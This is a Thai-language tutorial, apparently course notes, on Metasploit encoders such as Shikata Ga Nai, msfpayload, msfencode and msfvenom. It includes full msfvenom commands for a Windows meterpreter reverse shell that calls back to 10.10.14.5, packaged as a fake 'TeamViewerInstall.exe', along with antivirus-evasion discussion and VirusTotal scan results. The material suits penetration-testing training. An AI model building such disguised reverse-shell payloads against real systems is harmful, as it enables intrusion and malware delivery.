# Encoders ใน Metasploit Framework

## Encoders คืออะไร?

**Encoders** เป็นเครื่องมือที่มีอยู่ใน Metasploit Framework มากกว่า 15 ปี มีบทบาทสำคัญ 2 ประการ:

### 1. **ทำให้ Payload เข้ากันได้กับสถาปัตยกรรมต่างๆ**
รองรับสถาปัตยกรรมโปรเซสเซอร์ที่แตกต่างกัน:
- **x64** - 64-bit Intel/AMD
- **x86** - 32-bit Intel/AMD  
- **sparc** - Sun/Oracle SPARC
- **ppc** - PowerPC (IBM)
- **mips** - MIPS processors

### 2. **ช่วยหลบหลีก Antivirus (AV Evasion)**
- เข้ารหัส payload ในรูปแบบต่างๆ เพื่อหลีกเลี่ยงการตรวจจับ
- ลบตัวอักษร hexadecimal opcodes ที่เรียกว่า **"bad characters"** ออกจาก payload

---

## Shikata Ga Nai (SGN) - ตำนาน Encoder แห่งอดีต

### ประวัติและความหมาย
- **ชื่อ:** 仕方がない (Shikata Ga Nai)
- **แปลว่า:** "ช่วยไม่ได้" หรือ "ไม่มีอะไรทำได้แล้ว"
- **เทคนิค:** Polymorphic XOR Additive Feedback Encoder
- **อันดับ:** Excellent

### ทำไมถึงมีชื่อเสียง?
ในอดีต SGN เป็น encoder ที่ยากมากในการตรวจจับ เพราะใช้กลไกการเข้ารหัสที่ซับซ้อน อ่านรายละเอียดเพิ่มเติมได้จาก [บทความ FireEye](https://www.fireeye.com/blog/threat-research.html)

### สถานะปัจจุบัน
⚠️ **ในปัจจุบัน (2022+):**
- ระบบป้องกันสมัยใหม่ (IPS/IDS) พัฒนาขึ้นมาก
- การใช้ encoder เพื่อหลบ AV อย่างเดียว**ไม่เพียงพออีกต่อไปแล้ว**
- Payload ที่เข้ารหัสด้วย SGN ถูกตรวจพบได้ง่าย

---

## วิวัฒนาการของ Metasploit Payload Tools

### ก่อนปี 2015
ใช้เครื่องมือแยกกัน 2 ตัว:

#### 1. **msfpayload** 
- สร้าง payload
- ตั้งอยู่ที่ `/usr/share/framework2/`

#### 2. **msfencode**
- เข้ารหัส payload
- ใช้ pipe (`|`) เชื่อมต่อกับ msfpayload

**ตัวอย่างการใช้งาน:**
```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

### หลังปี 2015 - ยุค msfvenom
รวม msfpayload + msfencode เข้าด้วยกันเป็น **msfvenom**

**คำสั่งเดียวจบ:**
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

---

## การใช้งาน Encoders

### การดู Encoders ที่ใช้ได้
### ขั้นตอนการกรอง:
```
1. ตรวจสอบ Architecture ของ Payload
   ↓
2. ตรวจสอบ Platform (Windows/Linux/etc)
   ↓
3. กรอง Encoder ที่เข้ากันได้
   ↓
4. แสดงเฉพาะ Compatible Encoders
```


**ตัวอย่างผลลัพธ์สำหรับ x64:**
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================
   #  Name              Description
   -  ----              -----------
   0  generic/eicar     The EICAR Encoder
   1  generic/none      The "none" Encoder
   2  x64/xor           XOR Encoder
   3  x64/xor_dynamic   Dynamic key XOR Encoder
   4  x64/zutto_dekiru  Zutto Dekiru
```

**ตัวอย่างผลลัพธ์สำหรับ x86:**
```
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================
   Name                    Rank       Description
   ----                    ----       -----------
   generic/none            normal     The "none" Encoder
   x86/alpha_mixed         low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper         low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower  manual     Avoid UTF8/tolower
   x86/call4_dword_xor     normal     Call+4 Dword XOR Encoder
   x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder
   x86/fnstenv_mov         normal     Variable-length Fnstenv/mov Dword XOR Encoder
   ...อีกประมาณ 10+ ตัว
```



### การสร้าง Payload พร้อม Encoding

#### ตัวอย่างที่ 1: Encode 1 ครั้ง
```bash
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai \
  -f exe \
  -o ./TeamViewerInstall.exe
```

**ผลลัพธ์:**
- Payload size: 368 bytes
- Final size: 73,802 bytes
- **VirusTotal Detection: 54/69** ❌ (ถูกตรวจพบ 78%)

#### ตัวอย่างที่ 2: Encode 10 ครั้ง (Multiple Iterations)
```bash
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai \
  -f exe \
  -i 10 \
  -o TeamViewerInstall.exe
```

**ผลการ Encode แต่ละรอบ:**
```
Iteration 0: 368 bytes
Iteration 1: 395 bytes
Iteration 2: 422 bytes
Iteration 3: 449 bytes
...
Iteration 9: 611 bytes (final)
```

**ผลลัพธ์:**
- Payload size: 611 bytes (เพิ่มขึ้น 66%)
- Final size: 73,802 bytes
- **VirusTotal Detection: 52/65** ❌ (ถูกตรวจพบ 80%)

---

## การวิเคราะห์ด้วย VirusTotal

### วิธีที่ 1: อัปโหลดผ่านเว็บไซต์
ไปที่ [virustotal.com](https://www.virustotal.com) และอัปโหลดไฟล์

### วิธีที่ 2: ใช้ msf-virustotal (ต้องมี API Key)
```bash
msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
```

**ผลการตรวจสอบ:**
```
Analysis Report: TeamViewerInstall.exe (51/68)
==================================================

Antivirus              Detected  Result
---------              --------  ------
Microsoft              true      Trojan:Win32/Meterpreter.A
Kaspersky              true      HEUR:Trojan.Win32.Generic
Avast                  true      Win32:SwPatch [Wrm]
BitDefender            true      Trojan.CryptZ.Gen
ESET-NOD32             true      Win32/Rozena.AA
Sophos                 true      ML/PE-A + Mal/EncPk-ACE
McAfee                 true      Swrort.i
Symantec               true      Packed.Generic.347
TrendMicro             true      BKDR_SWRORT.SM
...
```

---

## การทำงานของ Shikata Ga Nai

### กลไกการเข้ารหัส
- ใช้ **XOR encryption** แบบ Polymorphic
- สร้าง XOR key แบบสุ่มในแต่ละครั้ง
- มีการ Additive Feedback Loop
- ทำให้ signature แตกต่างกันทุกครั้งที่สร้าง

### เปรียบเทียบ Payload ก่อนและหลัง Encode

**ก่อน Encode:**
```perl
$buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9"
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37"
...
```

**หลัง Encode ด้วย SGN:**
```perl
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
...
```

สังเกตว่า byte แรกเปลี่ยนจาก `\xda\xc1` เป็น `\xbb\x78` แล้ว

---

## พารามิเตอร์สำคัญของ msfvenom

| พารามิเตอร์ | ความหมาย | ตัวอย่าง |
|------------|----------|---------|
| `-a` | Architecture | `x86`, `x64` |
| `--platform` | ระบบปฏิบัติการ | `windows`, `linux` |
| `-p` | Payload | `windows/meterpreter/reverse_tcp` |
| `-e` | Encoder | `x86/shikata_ga_nai` |
| `-i` | จำนวนครั้งที่ encode | `10` (default=1) |
| `-f` | รูปแบบไฟล์ output | `exe`, `elf`, `perl`, `python` |
| `-b` | Bad characters ที่ต้องหลีกเลี่ยง | `"\x00"`, `"\x00\x0a\x0d"` |
| `-o` | ชื่อไฟล์ output | `payload.exe` |

---


---

## คำเตือนสำคัญ ⚠️

> **การใช้ Encoder เพียงอย่างเดียวไม่เพียงพอสำหรับการหลบ AV ในปัจจุบัน** 
> 
> แม้จะ encode 10 ครั้งด้วย Shikata Ga Nai ก็ยังถูก Antivirus ตรวจพบได้มากกว่า 75%
> 
> ต้องศึกษาเทคนิค **AV Evasion** เพิ่มเติมที่อยู่นอกเหนือขอบเขตของโมดูลนี้